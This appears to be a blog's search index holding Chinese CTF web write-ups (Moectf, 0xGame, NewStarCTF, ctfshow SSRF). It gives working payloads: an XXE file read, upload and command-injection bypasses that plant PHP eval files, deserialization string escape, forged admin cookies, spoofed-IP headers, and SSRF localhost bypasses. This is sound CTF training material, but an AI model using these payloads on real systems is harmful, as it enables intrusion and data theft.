<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Moectf-2023</title>
      <link href="/2023/10/04/Moectf-2023/"/>
      <url>/2023/10/04/Moectf-2023/</url>
      
        <content type="html"><![CDATA[<h3 id="http"><a href="#http" class="headerlink" title="http"></a>http</h3><img src="/2023/10/04/Moectf-2023/170243.png" class=""><p>对应着要求改包就行</p><img src="/2023/10/04/Moectf-2023/171502.png" class=""><h3 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h3><p>将压缩包下载下来，在pdf最后可找到一个字符串，先16进制解码，再base64解码即可</p><h3 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h3><p>F12全局审查元素搜索关键字<code>moectf</code>,成功发现在注释里藏着的flag</p><pre><code>&lt;!--经过tracker，破获出内容为moectf&#123;find_comments_0m9M43IkulWxnEustqohoxoa3zEsToT7&#125;--&gt;</code></pre><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>先下载attachments.tar:</p><img src="/2023/10/04/Moectf-2023/174032.png" class=""><p>可以看到是一些json格式的数据</p><p>根据提示，我们先注册</p><p>返回数据包{“error”: “ok”, “data”: {“status”: “ok”}}</p><p>然后登录：</p><img src="/2023/10/04/Moectf-2023/174646.png" class=""><p>这次返回了一个token：eyJ1c2VybmFtZSI6ICJmZW5nIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ&#x3D;&#x3D;</p><p>将此token携带上再次发包，并且请求头改为GET &#x2F;flag</p><p>返回一个假flag</p><p>base64解码token试试：</p><pre><code>&#123;&quot;username&quot;: &quot;feng&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;role&quot;: &quot;user&quot;&#125;</code></pre><p>将role的值改为admin再base64编码发包，成功获得flag</p><h3 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h3><p>这道题要写脚本：</p><pre><code>import requestsimport resession=requests.session()url=&quot;http://localhost:59398&quot;data=&#123;&quot;driver&quot;:&quot;ttycp3&quot;,&quot;steering_control&quot;:&#39;0&#39;,&quot;throttle&quot;:&#39;2&#39;&#125;for i in range(7):s=session.post(url=url,data=data)if &quot;moectf&quot; in s.text:print(s.text)breakatt=re.findall(&quot;&lt;font color=\&quot;red\&quot;&gt;([\u4e00-\u9fa5！，]+)&quot;,s.text)print(att)if &quot;直行&quot; in att[0]:data[&quot;steering_control&quot;]=&#39;0&#39;elif &quot;左&quot; in att[0]:data[&quot;steering_control&quot;]=&#39;1&#39;print(data)elif &quot;右&quot; in att[0]:data[&quot;steering_control&quot;]=&#39;-1&#39;if &quot;保持&quot; in att[0]:data[&quot;throttle&quot;]=&#39;1&#39;elif &quot;大&quot; in att[0]:data[&quot;throttle&quot;]=&#39;2&#39;elif &quot;小&quot; in att[0]:data[&quot;throttle&quot;]=&#39;0&#39;</code></pre><h3 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h3><p>经过测试发现只能上传.png文件，而且不能上传.htaccess</p><p>后面发现更改name的值可以显示源码：</p><img src="/2023/10/04/Moectf-2023/194707.png" class=""><pre><code>&lt;?php$targetDir = &#39;uploads/&#39;;$allowedExtensions = [&#39;png&#39;];if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39; &amp;&amp; isset($_FILES[&#39;file&#39;])) &#123;    $file = $_FILES[&#39;file&#39;];    $tmp_path = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];    if ($file[&#39;type&#39;] !== &#39;image/png&#39;) &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件类型不符合要求&#39;]));    &#125;    if (filesize($tmp_path) &gt; 512 * 1024) &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件太大&#39;]));    &#125;    $fileName = $file[&#39;name&#39;];    $fileNameParts = explode(&#39;.&#39;, $fileName);    if (count($fileNameParts) &gt;= 2) &#123;        $secondSegment = $fileNameParts[1];        if ($secondSegment !== &#39;png&#39;) &#123;            die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));        &#125;    &#125; else &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件后缀不符合要求&#39;]));    &#125;    $uploadFilePath = dirname(__FILE__) . &#39;/&#39; . $targetDir . basename($file[&#39;name&#39;]);    if (move_uploaded_file($tmp_path, $uploadFilePath)) &#123;        die(json_encode([&#39;success&#39; =&gt; true, &#39;file_path&#39; =&gt; $uploadFilePath]));    &#125; else &#123;        die(json_encode([&#39;success&#39; =&gt; false, &#39;message&#39; =&gt; &#39;文件上传失败&#39;]));    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p>审计一下发现它只对文件名第一个点后面的内容作检测，所以我们只需要传个hhh.png.php即可绕过</p><p>然后rce</p><h3 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h3><p>先随便抓一个包：</p><img src="/2023/10/04/Moectf-2023/221307.png" class=""><p>看这意思应该是xxe漏洞</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;xml&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/xml&gt;</code></pre><p>对payload进行url编码后拿到flag</p><h3 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h3><img src="/2023/10/04/Moectf-2023/200522.png" class=""><p>根据题目提示，对id进行爆破</p><img src="/2023/10/04/Moectf-2023/201818.png" class=""><p>在长度明显与别的有很大差别的163中找到flag</p><h3 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h3><p>这道题没有对后缀做限制，先正常访问传上去的php文件发现空白，我们随便修改文件名会报错：</p><img src="/2023/10/04/Moectf-2023/204413.png" class=""><p>我们尝试访问index.php，然后下载图片查看源码，里面啥也没有，再尝试&#x2F;flag:</p><pre><code>hello~Flag Not Here~Find Somewhere Else~&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;Not Here~~~~~~~~~~~~~ awa</code></pre><p>再访问Fl3g_n0t_Here_dont_peek!!!!!.php，这个文件想当然会在&#x2F;var&#x2F;www&#x2F;html文件夹下面</p><img src="/2023/10/04/Moectf-2023/205508.png" class=""><p>数组绕过即可</p><h3 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h3><p>index.php:</p><pre><code>&lt;?phphighlight_file(__FILE__);require_once(&#39;Hanxin.exe.php&#39;);$Chant = isset($_GET[&#39;chant&#39;]) ? $_GET[&#39;chant&#39;] : &#39;夺命十三枪&#39;;$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);$before = serialize($new_visitor);$after = Deadly_Thirteen_Spears::Make_a_Move($before);echo &#39;Your Movements: &#39; . $after . &#39;&lt;br&gt;&#39;;try&#123;    echo unserialize($after);&#125;catch (Exception $e) &#123;    echo &quot;Even Caused A Glitch...&quot;;&#125;?&gt; </code></pre><p>Hanxin.exe.php:</p><pre><code>&lt;?phpif (basename($_SERVER[&#39;SCRIPT_FILENAME&#39;]) === basename(__FILE__)) &#123;    highlight_file(__FILE__);&#125;class Deadly_Thirteen_Spears&#123;    private static $Top_Secret_Long_Spear_Techniques_Manual = array(        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;    );    public static function Make_a_Move($move)&#123;        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement)&#123;            $move = str_replace($index, $movement, $move);        &#125;        return $move;    &#125;&#125;class Omg_It_Is_So_Cool_Bring_Me_My_Flag&#123;    public $Chant = &#39;&#39;;    public $Spear_Owner = &#39;Nobody&#39;;    function __construct($chant)&#123;        $this-&gt;Chant = $chant;        $this-&gt;Spear_Owner = &#39;Nobody&#39;;    &#125;    function __toString()&#123;        if($this-&gt;Spear_Owner !== &#39;MaoLei&#39;)&#123;            return &#39;Far away from COOL...&#39;;        &#125;        else&#123;            return &quot;Omg You&#39;re So COOOOOL!!! &quot; . getenv(&#39;FLAG&#39;);        &#125;    &#125;&#125;?&gt; </code></pre><p>做题的时候老是想不起来字符串逃逸</p><p><code>&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code>共35个字符，找出相应的字符串复制几遍逃逸即可</p><pre><code>chant=fdsdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiangdi_shi_san_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</code></pre><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><pre><code>from secrets import users, saltimport hashlibimport base64import jsonimport http.serverwith open(&quot;flag.txt&quot;,&quot;r&quot;) as f:    FLAG = f.read().strip()def gethash(*items):    c = 0    for item in items:        if item is None:            continue        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?    return hex(c)[2:]assert &quot;admin&quot; in usersassert users[&quot;admin&quot;] == &quot;admin&quot;hashed_users = dict((k,gethash(k,v)) for k,v in users.items())eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,&quot;big&quot;,signed=True).decode().translate(&#123;ord(c):None for c in &quot;\x00&quot;&#125;)) # what is it?def decrypt(data:str):        for x in range(5):            data = base64.b64encode(data).decode() # ummm...? It looks like it&#39;s just base64 encoding it 5 times? truely?        return data__page__ = base64.b64encode(&quot;PCFET0NU...KPC9odG1sPg==&quot;)       class MyHandler(http.server.BaseHTTPRequestHandler):    def do_GET(self):        try:            if self.path == &quot;/&quot;:                self.send_response(200)                self.end_headers()                self.wfile.write(__page__)            else:                self.send_response(404)                self.end_headers()                self.wfile.write(b&quot;404 Not Found&quot;)        except Exception as e:            print(e)            self.send_response(500)            self.end_headers()            self.wfile.write(b&quot;500 Internal Server Error&quot;)    def do_POST(self):        try:            if self.path == &quot;/login&quot;:                body = self.rfile.read(int(self.headers.get(&quot;Content-Length&quot;)))                payload = json.loads(body)                params = json.loads(decrypt(payload[&quot;params&quot;]))                print(params)                if params.get(&quot;username&quot;) == &quot;admin&quot;:                    self.send_response(403)                    self.end_headers()                    self.wfile.write(b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;)                    print(&quot;admin&quot;)                    return                if params.get(&quot;username&quot;) == params.get(&quot;password&quot;):                    self.send_response(403)                    self.end_headers()                    self.wfile.write(b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;)                    print(&quot;same&quot;)                    return                hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))                for k,v in hashed_users.items():                    if hashed == v:                        data = &#123;                            &quot;user&quot;:k,                            &quot;hash&quot;:hashed,                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;                        &#125;                        self.send_response(200)                        self.end_headers()                        self.wfile.write(json.dumps(data).encode())                        print(&quot;success&quot;)                        return                self.send_response(403)                self.end_headers()                self.wfile.write(b&quot;Invalid username or password&quot;)            else:                self.send_response(404)                self.end_headers()                self.wfile.write(b&quot;404 Not Found&quot;)        except Exception as e:            print(e)            self.send_response(500)            self.end_headers()            self.wfile.write(b&quot;500 Internal Server Error&quot;)if __name__ == &quot;__main__&quot;:    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)    server.serve_forever()</code></pre><p>看不大懂，但可以看个大概</p><pre><code>hashed = gethash(params.get(&quot;username&quot;),params.get(&quot;password&quot;))                for k,v in hashed_users.items():                    if hashed == v:                        data = &#123;                            &quot;user&quot;:k,                            &quot;hash&quot;:hashed,                            &quot;flag&quot;: FLAG if k == &quot;admin&quot; else &quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;                        &#125;                        self.send_response(200)                        self.end_headers()                        self.wfile.write(json.dumps(data).encode())                        print(&quot;success&quot;)                        return</code></pre><p>这里要求我们的hashed等于v</p><p>hashed &#x3D; gethash(params.get(“username”),params.get(“password”))</p><pre><code>def gethash(*items):    c = 0    for item in items:        if item is None:            continue        c ^= int.from_bytes(hashlib.md5(f&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?    return hex(c)[2:]</code></pre><p>hashed就是将我们传入的username和password进行异或</p><pre><code>for k,v in hashed_users.items()hashed_users = dict((k,gethash(k,v)) for k,v in users.items())assert &quot;admin&quot; in usersassert users[&quot;admin&quot;] == &quot;admin&quot;</code></pre><p>这里，hashed_users就是{“admin”，0}，所以最后k就是“admin”，v就是0</p><p>最后也就是让hashed&#x3D;&#x3D;0，而我们前面知道，hashed就是将我们传入的username和password进行异或，所以只有username&#x3D;&#x3D;password时hashed才是0，而python代码又限制<code>username</code>和<code>password</code>不能相等</p><p>这里我们就要利用字符和数字进行绕过，例如我们传入<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125; </code>，二者类型不同所以不相等，但进行加盐哈希处理时会把数字当作字符串来处理，因此二者的<code>gethash</code>值为0，从而满足题目条件</p><img src="/2023/10/04/Moectf-2023/205615.png" class=""><p>题目对传入的数据进行了五次base64解码，所以我们就将<code>&#123;&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:1&#125;</code>加密五次后传入即可获得flag</p><h3 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h3><p>在源代码中发现一个wp-content&#x2F;plugins&#x2F;visitor-logging&#x2F;logger.php</p><img src="/2023/10/04/Moectf-2023/212200.png" class=""><p>可以直接sqlmap跑</p>]]></content>
      
      
      
        <tags>
            
            <tag> Moectf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame-2023</title>
      <link href="/2023/10/02/0xGame-2023/"/>
      <url>/2023/10/02/0xGame-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>这道题是信息搜集，打开题目后查看源代码，有个<code>assets/index-33309f51.js</code>，打开后在页面最底部可发现一个<code>sourceMappingURL=index-33309f51.js.map</code>,猜测可能是sourcemap文件泄露</p><p>将url栏中的<code>index-33309f51.js</code>用<code>index-33309f51.js.map</code>替换，即可下载文件</p><p>然后用reverse-sourcemap工具还原文件</p><pre><code>reverse-sourcemap -v index-33309f51.js.map -o output</code></pre><img src="/2023/10/02/0xGame-2023/185016.png" class=""><p>最后找了半天在src&#x2F;main.js里面找到了flag</p><h3 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h3><p>这道题就是改请求包的数据</p><img src="/2023/10/02/0xGame-2023/194458.png" class=""><h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><img src="/2023/10/02/0xGame-2023/194707.png" class=""><p>这道题原本思考了一下用c&#x3D;1024e2fff绕过，结果在本地可以，在靶场里就是不行，后面发现靶场用的是php7.4.27</p><p>所以这道题最后用c&#x3D;1024.2fff成功绕过</p><p>究其原因就是大概php7.0.9以上intval函数会自动识别字符串中的科学计数法</p><p>总结一下intval常见的绕过思路：</p><p><strong>int intval( $var, $base )</strong></p><p>base参数可选</p><p>当var为整形数字时，函数自动识别var使用的进制</p><p>当var为字符串时，将base设置为0后可自动识别var使用的进制</p><pre><code>绕过思路：1、进制自动转换2、数组绕过3、转换小数4、字符串整形转换（0x，0b,e）(php7.0以上已经可以识别科学计数法e)5、取反~ (当某个数字被过滤时，可以两次取反来绕过:intval(~~10)==intval(10))6、算数运算符（如果传入的 $var参数（只支持整形，不支持字符串）包含算数运算符，会先运算，再对运算结果进行转换）7、浮点数精度丢失问题（intval(0.58*100.0)==57）</code></pre><h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p>这道题就是命令执行</p><p>抓包然后用连接符执行命令</p><pre><code>（1）; //分号，没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。（2）|| //逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。（3）&amp;&amp; //逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</code></pre><p>但是测试时发现&#x2F;和空格被ban了，空格可以用%09绕过，&#x2F;不能用没法跳转目录</p><p>第二种方法就是写文件</p><pre><code>127.0.0.1&amp;echo%09&quot;&lt;?php%09eval(&quot;ls&quot;);&quot;%09&gt;hhh.php</code></pre><p>但是进入文件后发现报错，测试了一下发现<code>;</code>也被ban了</p><p>后面才知道还有一种方法，用base64编码</p><p>先将<code>&lt;?php eval(&quot;ls&quot;);</code>base64编码为PD9waHAlMDlldmFsKCJscyIpOw&#x3D;&#x3D;（注意编码后的字符串不能有加号，加号会被url解码为空格然后再ban掉）</p><p>然后再使用管道连接符base64解码命令</p><pre><code>127.0.0.1&amp;echo%09&quot;PD9waHAlMDlldmFsKCJscyIpOw==&quot;|base64%09-d%09&gt;hhh.php</code></pre><pre><code>| 管道连接符，使用此管道符“|”可以将两个命令分隔开，“|”左边命令的输出就会作为“|”右边命令的输入，此命令可连续使用</code></pre><p>后面发现这道题还可以看api.php的源码</p><h3 id="repo-leak"><a href="#repo-leak" class="headerlink" title="repo_leak"></a>repo_leak</h3><p>这道题要拿githacker跑</p><p>githacker –url <a href="http://120.27.148.152:50013/.git/">http://120.27.148.152:50013/.git/</a> –output-folder result</p><p>进入目录后查看历史版本 </p><pre><code>git log --reflog</code></pre><img src="/2023/10/02/0xGame-2023/200429.png" class=""><p>切换到有flag的版本</p><pre><code>git reset --hard 8a5b670558921bd232d75b29542492f00698298b</code></pre><p>在当前目录匹配包含flag的文件</p><pre><code>grep -r  &quot;flag&quot; ./</code></pre><img src="/2023/10/02/0xGame-2023/201628.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF_2023</title>
      <link href="/2023/09/26/NewStarCTF-2023/"/>
      <url>/2023/09/26/NewStarCTF-2023/</url>
      
        <content type="html"><![CDATA[<h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h4><p>题目提示泄露了一些敏感信息在Web根目录下</p><p>打开后猜测备份压缩文件名，这题的是<a href="http://www.zip/">www.zip</a></p><p>下载后flag在robots.txt和index.php文件里，拼接起来即可</p><p>常见备份文件后缀：</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><h4 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h4><p>这道题直接上传一句话木马文件即可，没有过滤</p><h4 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h4><img src="/2023/09/26/NewStarCTF-2023/211036.png" class=""><p>直接抓包：</p><img src="/2023/09/26/NewStarCTF-2023/211329.png" class=""><p>先是让给ctf用get方式传参，随便传一个</p><p>然后给secret用post方式从传参，传源代码中隐藏的一个值，要进行base64解码后再传（注意burp发包的时候哟要将请求头改为POST）</p><p>第三步将power的值改为ctfer</p><p>第四步将User-Agent的值改为NewStarCTF2023</p><p>第五步添加一个请求首部Referer: newstarctf.com</p><p>最后一步构造一个伪造ip首部 X-Real-IP: 127.0.0.1（试了一下只有这个可以）</p><pre><code>Origin 指示了请求来自于哪个站点，只有服务器名，不包含路径信息Referer 指示了请求来自于哪个具体页面，包含服务器名和路径的详细URLX-Forwarded-For是告诉服务器当前请求者的最终ip</code></pre><p>常见的可替换X-Forwarded-For的首部：</p><pre><code>X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Client-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded: 127.0.0.1True-Client-Ip: 127.0.0.1Proxy-Client-IP: 127.0.0.1</code></pre><h4 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h4><p>这关实际和Flask模板注入没关系，传入number1和number2即可再页面中找出flag</p><h4 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h4><img src="/2023/09/26/NewStarCTF-2023/214505.png" class=""><p>这题有五个关卡：</p><p>1、if($_GET[‘key1’] !&#x3D;&#x3D; $_GET[‘key2’] &amp;&amp; md5($_GET[‘key1’]) &#x3D;&#x3D; md5($_GET[‘key2’]))</p><p>很常见，直接用数组绕过</p><p>key1[]&#x3D;1&amp;key2[]&#x3D;3</p><p>2、if(md5($_POST[‘key3’]) &#x3D;&#x3D;&#x3D; sha1($_POST[‘key3’]))</p><p>还是直接用数组绕过</p><p>key3[]&#x3D;3</p><p>3、if(strcmp($_GET[‘key4’],file_get_contents(“&#x2F;flag”)) &#x3D;&#x3D; 0)</p><p>4、if(!is_numeric($_GET[‘key5’]) &amp;&amp; $_GET[‘key5’] &gt; 2023)</p><p>这里传key5&#x3D;2024abc就可以了</p><p>5、第五个关卡里<strong>extract</strong>函数的功能是从数组中将变量导入到当前的符号表，简单的说就是将数组的键名转换为变量名，将数组的值转换为变量的值</p><p>直接传个flag5&#x3D;*就可以</p><h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h4><img src="/2023/09/26/NewStarCTF-2023/220811.png" class=""><p>题目的意思是让你找到一个字符串，经过md5加密后的字符串前6位是c4d038</p><p>这里就只能写个脚本跑一下</p><pre><code>import hashlibdic=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;flag=&quot;c4d038&quot;def md5():    for a in dic:        for b in dic:            for c in dic:                for d in dic:                    for e in dic:                        t=str(a+b+c+d+e)                        md5=hashlib.md5(t.encode(&#39;utf-8&#39;)).hexdigest()                        if(md5[0:6]==flag):                            print(t)                            returnmd5()</code></pre><p>跑出一个04p9l</p><p>然后命令执行过滤了一些命令，但问题不大</p><p>用&#96;&#96;替代system函数，用f’l’ag绕过flag</p><pre><code>payload password=04p9l&amp;e[v.a.l=echo `c&#39;a&#39;t /f&#39;l&#39;ag`;</code></pre><p>官方题解：</p><pre><code>POST:e[v.a.l=var_dump(file_get_contents($_GET[&#39;a&#39;]));\GET:a=/flag</code></pre><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>看了一下官方题解</p><p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p><p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p><p><code>Ctrl</code>+<code>D</code>回到 Shell，简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询Bash历史记录。</p><img src="/2023/09/26/NewStarCTF-2023/180143.png" class=""><p>发现 Hint，第一句意思是将“newstar”和“newstar2023”这两个密码加入弱密码文件，第二句意思是将将密码设为密码文件中的任意一个。</p><p>得知 admin 的密码为弱密码加上<code>newstar newstar2023</code>后其中的一个。</p><p>按<code>CtrlD</code>或者输入<code>exit</code>后回车回到登录界面。</p><p>试一下<code>newstar``newstar2023</code>，没登进去，在网上随便搜弱密码，试一些常见的，试出来是<code>000000</code>，不同的靶机密码可能不一样。</p><p>题目采用的弱密码表</p><pre><code>123456789passwordnewstarnewstar2023123qweqwe123qwertyuiopasdfghjklzxcvbnmadmin123admin888111111000000</code></pre><p>查询历史记录只提示了使用<code>BurpSuite</code>，尝试抓包。</p><img src="/2023/09/26/NewStarCTF-2023/180953.png" class=""><p>使用<code>BurpSuite</code>拦截、开启代理，重新完成一次登录，发现一个<code>/passport</code>的 302 跳转，查看它的响应获取 flag.</p><img src="/2023/09/26/NewStarCTF-2023/184505.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf(ctfshow)</title>
      <link href="/2023/08/23/ssrf(ctfshow)/"/>
      <url>/2023/08/23/ssrf(ctfshow)/</url>
      
        <content type="html"><![CDATA[<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code>&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#39;url&#39;];$ch=curl_init($url);//初始化 cURL 会话curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。$result=curl_exec($ch);//执行 cURL 会话curl_close($ch);//关闭 cURL 会话echo ($result);?&gt;</code></pre><p>payload: url&#x3D;127.0.0.1&#x2F;flag.php</p><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><p>parse_url()函数会解析url并返回关联数组</p><pre><code>$url = &#39;http://username:password@hostname:9090/path?arg=value#anchor&#39;;var_dump(parse_url($url));array(8) &#123;  [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot;  [&quot;host&quot;]=&gt;  string(8) &quot;hostname&quot;  [&quot;port&quot;]=&gt;  int(9090)  [&quot;user&quot;]=&gt;  string(8) &quot;username&quot;  [&quot;pass&quot;]=&gt;  string(8) &quot;password&quot;  [&quot;path&quot;]=&gt;  string(5) &quot;/path&quot;  [&quot;query&quot;]=&gt;  string(9) &quot;arg=value&quot;  [&quot;fragment&quot;]=&gt;  string(6) &quot;anchor&quot;&#125;</code></pre><p>这关看似使用了正则匹配preg_match，但缺少参数，没啥用</p><pre><code>url=http://127.0.0.1/flag.phpurl=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.php     //16进制url=http://0177.0.0.1/flag.php   //8进制url=http://2130706433/flag.php     //10进制整数格式url=http://0x7F000001/flag.php     //16进制整数格式url=http://127.0.1/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>直接绕过</p><pre><code>url=http://0/flag.phpurl=http://0.0.0.0/flag.phpurl=http://0x7f.0.0.1/flag.phpurl=http://0177.0.0.1/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><p>这题把0和1都屏蔽了</p><p>http(s):<em>&#x2F;&#x2F;sudo.cc&#x2F;指向127.0.0.1</em></p><pre><code>url=http://sudo.cc/flag.php</code></pre><p>也可以用自己的域名，让他解析到127.0.0.1来用</p><pre><code>&lt;?php header(&quot;Location: http://127.0.0.1/flag.php&quot;);# POST: url=http://your-domain/ssrf.php</code></pre><h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><p>多了一个限制让host位数小于5</p><pre><code>url=http://0/flag.phpurl=http://127.1/flag.php</code></pre><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><p>限制host位数小于3</p><pre><code>url=http://0/flag.php</code></pre><h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><p>利用302跳转和dns重绑定都可以。</p><pre><code>&lt;?phpheader(&quot;Location:http://127.0.0.1/flag.php&quot;); 